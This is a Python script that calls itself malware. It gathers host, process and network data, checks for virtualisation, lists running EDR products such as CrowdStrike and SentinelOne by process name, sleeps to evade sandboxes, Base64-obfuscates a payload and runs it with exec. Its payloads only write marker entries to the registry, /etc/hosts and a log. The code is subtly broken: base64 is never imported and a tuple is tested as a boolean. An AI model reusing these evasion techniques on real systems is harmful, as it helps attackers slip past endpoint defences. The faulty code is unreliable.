import os
import platform
import psutil
import subprocess
import socket
import json
from datetime import datetime
from multiprocessing import Process

def collect_system_info():
    info = {
        "os": platform.system(),
        "os_version": platform.version(),
        "cpu_count": os.cpu_count(),
        "memory": psutil.virtual_memory().total,
        "hostname": socket.gethostname(),
        "machine_type": platform.machine(),
        "is_virtual": is_virtualized(),
    }
    return info

def collect_process_info():
    processes = []
    for proc in psutil.process_iter(['pid', 'name']):
        processes.append(proc.info)
    return processes

def collect_network_info():
    connections = []
    for conn in psutil.net_connections(kind='inet'):
        connections.append({
            "local_address": conn.laddr,
            "remote_address": conn.raddr,
            "status": conn.status
        })
    return connections

def is_virtualized():
    try:
        output = subprocess.check_output("systemd-detect-virt", shell=True)
        if output.decode().strip() != "none":
            return True, output.decode().strip()
    except subprocess.CalledProcessError:
        pass
    
    virtualization_signatures = [
        "/sys/class/dmi/id/product_name",
        "/proc/scsi/scsi",
        "/sys/hypervisor/uuid",
        "/sys/class/dmi/id/sys_vendor"
    ]
    
    for file in virtualization_signatures:
        if os.path.exists(file):
            with open(file, "r") as f:
                content = f.read().lower()
                if any(keyword in content for keyword in ["vmware", "virtualbox", "kvm", "hyper-v", "qemu", "xen"]):
                    return True, content.strip()
    
    return False, ""

def detect_edr_processes():
    edr_process_names = {
        "CrowdStrike Falcon": ["csagent.exe", "falcond.exe"],
        "Carbon Black": ["cb.exe", "cbdefense.exe", "carbonblack.exe"],
        "SentinelOne": ["SentinelAgent.exe", "SentinelAgentService.exe"],
        "Symantec Endpoint Protection": ["smc.exe", "ccSvcHst.exe"],
        "Microsoft Defender for Endpoint": ["SenseCncProxy.exe", "MsSense.exe"],
        "McAfee Endpoint Security": ["McShield.exe", "mfetp.exe"],
        "Palo Alto Networks Cortex XDR": ["cyserver.exe", "cyendpoint.exe"],
        "FireEye Endpoint Security": ["xagt.exe"],
        "Sophos": ["SophosMcsAgent.exe", "SophosMcsClient.exe"],
        "Bitdefender GravityZone": ["epsecurityservice.exe", "bdservicehost.exe"]
    }
    
    detected_edr = []
    for proc in psutil.process_iter(['pid', 'name']):
        for edr, processes in edr_process_names.items():
            if proc.info['name'].lower() in [p.lower() for p in processes]:
                detected_edr.append({"edr_name": edr, "process_name": proc.info['name'], "pid": proc.info['pid']})
    
    return detected_edr

def detect_physical_server():
    is_virtual, _ = is_virtualized()
    if not is_virtual:
        return True, "No virtualization detected"
    return False, ""

def collect_all_data():
    data = {}
    data['timestamp'] = datetime.now().isoformat()
    data['system_info'] = collect_system_info()
    data['process_info'] = collect_process_info()
    data['network_info'] = collect_network_info()
    data['edr_detected'] = detect_edr_processes()
    data['is_virtualized'], data['virtualization_info'] = is_virtualized()
    data['is_physical'], data['physical_info'] = detect_physical_server()
    return data

def save_data_to_file(data, filename='collected_data.json'):
    with open(filename, 'a') as f:
        json.dump(data, f)
        f.write("\n")

def execute_payload():
    # Simple payload example: Writing to a file and modifying system files
    try:
        if platform.system() == "Windows":
            # Windows payload example: Create a registry key
            import winreg as reg
            reg.CreateKey(reg.HKEY_CURRENT_USER, r"Software\MyTestPayload")
            with open("payload_execution.txt", "a") as f:
                f.write(f"Payload executed on Windows at {datetime.now()}\n")
            print("Payload executed on Windows and logged to 'payload_execution.txt'.")
        else:
            # Unix-based payload example: Modify /etc/hosts (requires sudo)
            with open("/etc/hosts", "a") as f:
                f.write(f"# Payload executed at {datetime.now()}\n")
            with open("payload_execution.txt", "a") as f:
                f.write(f"Payload executed on Unix-based system at {datetime.now()}\n")
            print("Payload executed on Unix-based system and logged to 'payload_execution.txt'.")
    except Exception as e:
        print(f"Payload execution failed: {e}")

def adapt_behavior_and_execute_payload(data):
    # Example decision-making logic based on environment data
    if data['system_info']['is_virtual']:
        print("Detected virtual environment. Adapting payload...")
        # Example adaptation: delay execution or modify payload behavior
        delay_execution()

    if data['edr_detected']:
        print(f"Detected EDR presence: {[edr['edr_name'] for edr in data['edr_detected']]}. Attempting to obfuscate payload...")
        # Example obfuscation
        payload_code = """
def execute_payload():
    try:
        with open("payload_execution.txt", "a") as f:
            f.write("Obfuscated payload executed.")
    except Exception as e:
        print(f"Payload execution failed: {e}")
execute_payload()
"""
        obfuscated_payload = obfuscate_payload(payload_code)
        exec(obfuscated_payload)
        return

    # Execute the payload after adapting to the environment
    execute_payload()

def delay_execution():
    # Delay the execution to evade sandbox detection
    import time
    print("Delaying execution...")
    time.sleep(300)  # Delay for 5 minutes
    print("Resuming execution...")

def obfuscate_payload(payload_function):
    # Basic obfuscation by encoding the payload function using Base64
    encoded_payload = base64.b64encode(payload_function.encode('utf-8')).decode('utf-8')
    obfuscated_code = f"""
import base64
exec(base64.b64decode("{encoded_payload}").decode('utf-8'))
"""
    return obfuscated_code

def run_malware():
    # Run the malware payload in a separate process
    collected_data = collect_all_data()
    save_data_to_file(collected_data)
    adapt_behavior_and_execute_payload(collected_data)

if __name__ == "__main__":
    # Create a new process to run the malware payload
    malware_process = Process(target=run_malware)
    malware_process.start()
    malware_process.join()

    print("Malware process executed.")
